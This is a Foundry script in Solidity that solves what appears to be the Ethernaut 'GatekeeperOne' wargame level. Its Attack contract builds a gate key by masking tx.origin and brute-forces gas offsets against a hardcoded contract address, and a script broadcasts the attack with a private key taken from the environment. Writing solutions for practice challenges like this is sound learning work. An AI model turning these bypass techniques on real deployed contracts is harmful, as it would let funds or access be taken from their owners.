// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level13.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Attack {
    GatekeeperOne public instance =
        GatekeeperOne(0xd216C1041909516Dd89a471ECdb96aB3E7ae4Abd);

    function exploit() external {
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) &
            0xFFFFFFFF0000FFFF;
        for (uint256 i = 0; i < 300; i++) {
            uint256 totalgas = i + (8191 * 3);
            (bool success, ) = address(instance).call{gas: totalgas}(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );
            if (success) {
                break;
            }
        }
    }
}

contract Level13Sol is Script {
    GatekeeperOne public instance =
        GatekeeperOne(0xd216C1041909516Dd89a471ECdb96aB3E7ae4Abd);
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        new Attack().exploit();

        vm.stopBroadcast();
    }
}
